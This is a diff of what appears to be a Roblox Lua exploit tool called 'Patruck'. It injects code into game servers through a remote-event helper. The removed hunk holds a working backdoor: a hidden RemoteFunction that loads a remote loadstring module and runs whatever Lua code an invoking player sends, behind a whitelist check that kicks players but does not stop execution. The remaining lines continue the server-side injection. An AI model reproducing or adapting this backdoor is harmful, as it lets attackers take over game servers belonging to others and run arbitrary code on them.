@@ -1,5 +1,3 @@
-_G.Version = 1.2
-
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
@@ -2473,31 +2471,6 @@ fireRemoteEvent([[
 	  end
 end]])
 
-local whitelistString = "{"
-for _, name in ipairs(whitelisted) do
-    whitelistString = whitelistString .. '["' .. name .. '"] = true, '
-end
-whitelistString = whitelistString .. "}"
-
-fireRemoteEvent([[
-	local frm = game:GetService("FeatureRestrictionManager")
-	
-	local remoteFunction = Instance.new("RemoteFunction")
-	remoteFunction.Name = "spunch.bd_cssr6-01"
-	remoteFunction.Parent = frm
-
-    local whitelist = ]] .. whitelistString .. [[
-
-	local loadstring = require(5612987995)
-	
-	remoteFunction.OnServerInvoke = function(player, code)
-	    if not whitelist[player.Name] then
-	        player:Kick("Backdoor has been secured by Patruck - Private Backdoor.")
-	    end
-	    loadstring(code)()
-	end
-]])
-
 fireRemoteEvent([[
 	local Players = game:GetService("Players")
 	
@@ -2911,4 +2884,3 @@ fireRemoteEvent([[
         LMG2["ScanButton_c"]["Text"] = "Scan Backdoor"
     end
 end)
-notify.Info("Patruck","Loaded! Version:", _G.Version)
